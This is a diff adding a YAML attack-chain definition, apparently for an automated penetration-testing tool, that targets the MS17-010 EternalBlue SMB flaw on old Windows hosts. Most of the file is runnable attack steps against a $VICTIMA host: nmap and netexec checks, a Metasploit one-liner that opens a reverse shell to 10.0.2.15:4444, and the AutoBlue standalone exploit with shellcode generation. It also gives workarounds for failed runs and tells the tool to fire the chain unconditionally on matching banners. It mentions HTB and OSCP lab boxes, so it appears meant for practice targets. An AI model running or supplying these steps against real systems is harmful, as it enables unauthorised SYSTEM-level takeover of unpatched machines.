@@ -1,0 +1,51 @@
+chain_id: ms17_010_eternalblue
+title: "MS17-010 EternalBlue — unauth SMB RCE (CVE-2017-0143)"
+severity: CRITICAL
+tags: [smb, eternalblue, ms17-010, cve-2017-0143, unauth, rce]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)windows.*(7|2008|xp)" }
+    - { banner_pattern: "(?i)windows server (2003|2008|7|xp)" }
+
+description: |
+  Unpatched Windows hosts (XP/2003/7/2008/2008 R2 without MS17-010) are
+  vulnerable to EternalBlue — a pre-auth SMB kernel exploit that lands
+  directly as SYSTEM. nmap tags the OS via banners; if the version is
+  pre-Windows 8, fire the chain unconditionally and confirm with a
+  scanner before executing.
+
+steps:
+  - id: 1
+    title: "Confirm vulnerability with nmap NSE script"
+    command: nmap -p445 --script smb-vuln-ms17-010 $VICTIMA
+
+  - id: 2
+    title: "Or netexec — same check, no script edits needed"
+    command: netexec smb $VICTIMA -M ms17-010
+
+  - id: 3
+    title: "Exploit with Metasploit (most reliable)"
+    command: |
+      msfconsole -qx 'use exploit/windows/smb/ms17_010_eternalblue; \
+        set RHOSTS $VICTIMA; set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 4
+    title: "Standalone Python exploit (no MSF dependency)"
+    command: |
+      git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+      cd AutoBlue-MS17-010
+      ./eternal_checker.py $VICTIMA           # reconfirm
+      ./shellcode/shell_prep.sh                # generate windows shellcode
+      python eternalblue_exploit7.py $VICTIMA shellcode/sc_x64.bin
+
+common_errors:
+  - error: "Exploit fails on Windows 7 SP1 — kernel KASLR mitigates"
+    solution: |
+      Use the eternalblue_exploit8 variant instead, or pivot to
+      MS17-010 + DoublePulsar from FuzzBunch. Many HTB/OSCP boxes are
+      stuck on Windows 7 RTM where the original PoC works.
+
+references:
+  - https://www.exploit-db.com/exploits/42031
+  - https://github.com/3ndG4me/AutoBlue-MS17-010
